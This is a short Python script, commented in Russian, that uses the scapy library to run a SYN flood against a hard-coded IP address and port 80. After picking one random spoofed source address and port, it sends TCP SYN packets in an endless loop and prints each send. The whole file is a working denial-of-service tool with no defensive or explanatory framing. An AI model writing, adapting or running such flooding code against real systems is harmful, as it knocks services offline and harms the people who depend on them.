import threading

import requests
from scapy.all import IP, TCP, send
import random

# Целевой IP и порт
target_ip = "192.168.1.34"
target_port = 80

# Функция для отправки SYN-пакетов
def syn_flood(target_ip, target_port):
    try:
        # Генерация случайного исходного порта и IP
        src_port = random.randint(1024, 65535)
        src_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
        while True:
            # Создание IP и TCP-пакета
            packet = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")

            # Отправка пакета
            send(packet, verbose=False)
            print(f"[+] Sent SYN packet from {src_ip}:{src_port} to {target_ip}:{target_port}")
    except KeyboardInterrupt:
        print("[-] SYN Flood stopped.")

# Запуск SYN Flood
syn_flood(target_ip, target_port)